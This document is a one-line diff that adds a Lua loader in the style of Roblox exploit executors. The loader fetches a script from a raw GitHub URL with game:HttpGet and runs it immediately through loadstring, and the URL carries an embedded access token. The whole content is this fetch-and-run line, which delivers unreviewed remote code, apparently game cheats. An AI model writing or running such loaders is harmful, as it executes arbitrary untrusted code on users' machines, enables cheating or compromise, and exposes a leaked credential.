@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Haider6400/YTKkBcX/refs/heads/main/Script%20iraq%20313%20lua..txt?token=GHSAT0AAAAAACWBCEEGW7HBO25HBZ3XH4XUZXZDZQA"))()
